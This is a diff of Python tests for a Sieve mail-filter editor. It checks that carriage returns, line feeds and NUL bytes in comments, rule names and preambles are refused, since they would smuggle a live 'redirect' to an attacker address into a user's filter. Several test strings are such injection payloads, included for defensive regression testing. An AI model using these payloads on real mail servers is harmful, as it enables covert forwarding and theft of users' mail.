@@ -261,7 +261,7 @@ def test_a_require_statement_split_across_the_preamble_and_the_require_bytes_is_
     assert st.preflight_error(script) is not None
 
 
-# ── The carriage return that ends a line for the server but not for us ──
+# ── Bytes that end a line for the server and not for us ──
 
 
 _CR_SMUGGLED = '# harmless note\rredirect "attacker@example.com";'
@@ -340,5 +340,119 @@ def test_the_endpoint_rejects_a_smuggled_carriage_return_without_writing(authed_
                 "entries": [],
             },
         )
+    assert r.status_code == 400, r.text
+    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"
+
+
+_LF_SMUGGLED = 'c\nredirect "attacker@example.com";'
+
+
+def test_a_line_break_in_a_raw_block_comment_is_refused():
+    """The half of door 3 the CR check missed, and the worse half: a bare LF
+    needs no reading of the RFC at all. `_canonical_span` interpolates the
+    comment into `f"# {comment}\\n{text}"`, so the newline ends the comment and
+    the redirect below it is a live statement. It reached the mail server
+    through `PUT` with a 200, because a RawBlock never meets the per-rule
+    sievelib check — `preflight_error` loops `script.rules`.
+    """
+    block = st.RawBlock(text="keep;", comment=_LF_SMUGGLED)
+    assert st.preflight_error(st.SieveScript(entries=[block])) is not None
+
+
+def test_a_line_break_in_a_rule_name_is_refused():
+    """Same interpolation, `f"# --- {name} ---"`. An ENABLED rule happened to be
+    caught by sievelib choking on the orphaned `---`, and a disabled one by the
+    same accident — by luck of another checker's grammar rather than by anything
+    that meant to refuse it. This means to.
+    """
+    rule = st.Rule(
+        name=_LF_SMUGGLED,
+        conditions=[st.Condition(header="subject", match_type="contains", value="x")],
+        actions=[st.Action(action_type="keep")],
+    )
+    assert st.preflight_error(st.SieveScript(entries=[rule])) is not None
+
+
+def test_a_multi_line_raw_block_body_is_not_refused():
+    """The scoping, and the reason the LF check names two fields rather than
+    looping every field the CR check does. `RawBlock.text` is many lines by
+    definition — every multi-line `vacation` in the corpus is one — and so are
+    `source`, `preamble`, `requires_source` and `tail`. Asking the LF question
+    of any of them turns this guard into a lockout that refuses nearly every
+    real script.
+    """
+    block = st.RawBlock(text="vacation :days 7 text:\nAway until Monday.\n.\n;", comment="note")
+    assert st.preflight_error(st.SieveScript(entries=[block])) is None
+
+
+def test_a_nul_in_the_preamble_is_refused():
+    """RFC 5228's `octet-not-crlf` excludes %x00, so a NUL is never valid Sieve,
+    and against a C-implemented server (Dovecot) truncation at the NUL is the
+    classic desync — everything after it is the server's problem rather than
+    something we can reason about."""
+    script = st.SieveScript(preamble='# n\x00redirect "attacker@example.com";\n')
+    assert st.preflight_error(script) is not None
+
+
+def test_a_nul_in_a_comment_or_a_tail_is_refused():
+    assert st.preflight_error(st.SieveScript(tail='\n# t\x00redirect "a@b.com";\n')) is not None
+    block = st.RawBlock(text="keep;", comment='c\x00redirect "a@b.com";')
+    assert st.preflight_error(st.SieveScript(entries=[block])) is not None
+
+
+def test_a_script_that_already_holds_a_nul_can_still_be_saved():
+    """The scoping decision on NUL, and it is a real tradeoff rather than a free
+    win. A file with a NUL in it fails to lex and comes back as one whole-file
+    RawBlock, with the NUL in `text` and `source` and nowhere else. Refusing it
+    there would lock a user out of saving their own file over a byte that was
+    already on their server — and re-emitting bytes that are already there
+    changes nothing, whereas injecting new ones does. So those two fields are
+    exempt, and the injection sites above are not.
+    """
+    script = st.parse_sieve("keep;\n\x00 broken\n")
+    assert isinstance(script.entries[0], st.RawBlock), "premise: this is one raw block"
+    assert "\x00" in script.entries[0].text, "premise: the NUL is in text, not the boundary"
+    assert st.preflight_error(script) is None
+
+
+# ── Through the endpoint, which is where the reviewer found these ──
+
+
+def _put(http, **body):
+    return http.put("/api/scripts/primary", json={"requires": [], "entries": [], **body})
+
+
+def test_the_endpoint_rejects_a_line_break_in_a_raw_comment_without_writing(authed_client):
+    store = FakeScriptStore({"primary": "keep;\n"})
+    with authed_client(script_store=store) as http:
+        r = _put(http, entries=[{"kind": "raw", "text": "keep;", "comment": _LF_SMUGGLED}])
+    assert r.status_code == 400, r.text
+    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"
+
+
+def test_the_endpoint_rejects_a_line_break_in_a_rule_name_without_writing(authed_client):
+    store = FakeScriptStore({"primary": "keep;\n"})
+    with authed_client(script_store=store) as http:
+        r = _put(
+            http,
+            entries=[
+                {
+                    "kind": "rule",
+                    "name": _LF_SMUGGLED,
+                    "enabled": False,
+                    "match": "anyof",
+                    "conditions": [{"header": "subject", "match_type": "contains", "value": "x"}],
+                    "actions": [{"type": "keep"}],
+                }
+            ],
+        )
+    assert r.status_code == 400, r.text
+    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"
+
+
+def test_the_endpoint_rejects_a_nul_in_the_preamble_without_writing(authed_client):
+    store = FakeScriptStore({"primary": "keep;\n"})
+    with authed_client(script_store=store) as http:
+        r = _put(http, preamble='# n\x00redirect "attacker@example.com";\n')
     assert r.status_code == 400, r.text
     assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"
